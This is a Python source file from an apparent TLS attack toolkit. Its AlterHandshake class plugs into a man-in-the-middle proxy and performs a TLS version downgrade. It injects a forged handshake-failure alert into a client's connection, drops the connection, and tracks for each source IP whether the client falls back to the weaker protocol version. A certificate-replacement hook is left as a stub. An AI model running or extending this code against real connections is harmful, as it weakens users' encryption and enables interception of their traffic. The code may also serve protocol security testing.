import logging
import time
import enum

from tls_attack.structure.TLSHandshake import *
from tls_attack.structure.TLSClientHello import *
from tls_attack.structure.TLSServerHello import *
from tls_attack.structure.TLSAlert import *
from tls_attack.structure.TLSCipherSuiteStruct import *
from tls_attack.structure.TLSEmpty import *
from tls_attack.structure.TLSHeader import *
from tls_attack.structure.TLSSource import *

class DowngradeSupportState(enum.Enum):
    UNKNOWN     = -1
    TESTING     = -2

    UNSUPPORTED = 0
    SUPPORTED   = 1

class AlterHandshake:
    def __init__(self, proxy):
        self.proxy = proxy
        self.certificate = None
        self.tls_version = None
        self.source_support = {}
        
    def start(self):
        self.proxy.on_packet_received(self._handle)
        self.proxy.start()

    def downgrade_tls_version(self, version):
        self.tls_version = version

    def replace_certificate(self, certificate):
        # TODO 
        pass

    def _handle(self, connection, tls_object, state, source):

        # TLS version downgrade attack
        if not self.tls_version is None:
            if not connection.source_ip in self.source_support:
                self.source_support[connection.source_ip] = DowngradeSupportState.UNKNOWN

            if type(tls_object.body) is TLSHandshake:
                handshake = tls_object.body

                if type(handshake.body) is TLSClientHello:
                    hello = handshake.body
                    source_state = self.source_support[connection.source_ip]
                    logging.info("[%s] Current TLS version : %s Target TLS version : %s" % (connection.id, hello.version, self.tls_version))

                    if hello.version > self.tls_version:
                        # TODO : We should be doing the same thing, but with the server 
                        # (if it supports the target TLS version)

                        if source_state == DowngradeSupportState.UNKNOWN or source_state == DowngradeSupportState.SUPPORTED:
                            if source_state == DowngradeSupportState.UNKNOWN:
                                self.source_support[connection.source_ip] = DowngradeSupportState.TESTING
                                logging.warn("[%s] Attempting a downgrade attack for the source '%s'." % (connection.id, connection.source_ip))

                            alert_message = TLSHeader()
                            alert_message.content_type = TLSContentType.TLSAlert.value
                            alert_message.version = self.tls_version
                            alert_message.body = TLSAlert()
                            alert_message.body.level = TLSAlertLevel.WARNING
                            alert_message.body.description = TLSAlertDescription.HANDSHAKE_FAILURE
                            alert_message.length = len(alert_message.body.encode(state, source))

                            logging.warning("[%s] Sending TLS Fatal. %s" % (connection.id, str(alert_message.encode(state, source))))
                            self.proxy.send_packet(connection.id, source, alert_message.encode(state, source))

                            logging.warning("[%s] Dropping connection for downgrade." % (connection.id))
                            self.proxy.drop_connection(connection.id)
                            return TLSEmpty()

                        elif source_state == DowngradeSupportState.TESTING:
                            logging.warn("[%s] Downgrade attack didn't work for the source '%s'." % (connection.id, connection.source_ip))
                            self.source_support[connection.source_ip] = DowngradeSupportState.UNSUPPORTED

                    if hello.version == self.tls_version:
                        if source_state == DowngradeSupportState.TESTING:
                            self.source_support[connection.source_ip] = DowngradeSupportState.SUPPORTED
                            logging.warn("[%s] Downgrade attack worked for the source '%s'." % (connection.id, connection.source_ip))


        return tls_object